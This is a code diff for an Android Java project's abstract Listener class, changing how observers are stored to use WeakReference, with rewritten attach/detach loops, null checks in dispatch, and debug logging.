@@ -7,38 +7,50 @@
 
 package com.android.dvci.listener;
 
-import java.util.ArrayList;
-import java.util.List;
-
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.interfaces.Observer;
 import com.android.dvci.util.Check;
 
+import java.lang.ref.WeakReference;
+import java.util.ArrayList;
+import java.util.Iterator;
+import java.util.List;
+
 public abstract class Listener<U> {
-	/** The Constant TAG. */
+	/**
+	 * The Constant TAG.
+	 */
 	private static final String TAG = "Listener"; //$NON-NLS-1$
 
-	protected List<Observer<U>> observers;
+	protected List<WeakReference<Observer<U>>> observers;
 
 	private boolean suspended;
 
 	private Object suspendLock = new Object();
 
 	public Listener() {
-		observers = new ArrayList<Observer<U>>();
+		observers = new ArrayList<WeakReference<Observer<U>>>();
 	}
 
 	public synchronized boolean attach(Observer<U> o) {
 		// Object already in the stack
-		if (observers.contains(o)) {
-			return false;
+
+		for (Iterator<WeakReference<Observer<U>>> iterator = observers.iterator();
+		     iterator.hasNext(); ) {
+			WeakReference<Observer<U>> weakRef = iterator.next();
+			if (weakRef.get() == o) {
+				return false;
+			}
 		}
 
 		if (observers.isEmpty()) {
 			start();
 		}
 
-		observers.add(o);
+		observers.add(new WeakReference<Observer<U>>(o));
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (attach): adding:"+o.hashCode());
+		}
 		return true;
 	}
 
@@ -46,9 +58,19 @@ public abstract class Listener<U> {
 		if (observers.isEmpty()) {
 			return;
 		}
-		if (observers.contains(o)) {
-			observers.remove(o);
+
+		for (Iterator<WeakReference<Observer<U>>> iterator = observers.iterator();
+		     iterator.hasNext(); ) {
+			WeakReference<Observer<U>> weakRef = iterator.next();
+			if (weakRef.get() == o) {
+				weakRef.clear();
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (detach): removing:"+o.hashCode());
+				}
+				iterator.remove();
+			}
 		}
+
 		if (observers.isEmpty()) {
 			stop();
 		}
@@ -56,13 +78,13 @@ public abstract class Listener<U> {
 
 	/**
 	 * dispatch, per ogni observer registrato viene chiamato il notification
-	 * 
+	 *
 	 * @param elem
 	 * @return
 	 */
 	int dispatch(U elem) {
 		Object[] array;
-		
+
 		synchronized (this) {
 			array = observers.toArray();
 		}
@@ -70,8 +92,10 @@ public abstract class Listener<U> {
 
 		for (final Object element : array) {
 			@SuppressWarnings("unchecked")
-			final Observer<U> observer = (Observer<U>) element;
-			result |= observer.notification(elem);
+			final WeakReference<Observer<U>> observer = (WeakReference<Observer<U>>) element;
+			if(observer.get() != null) {
+				result |= observer.get().notification(elem);
+			}
 		}
 
 		return result;
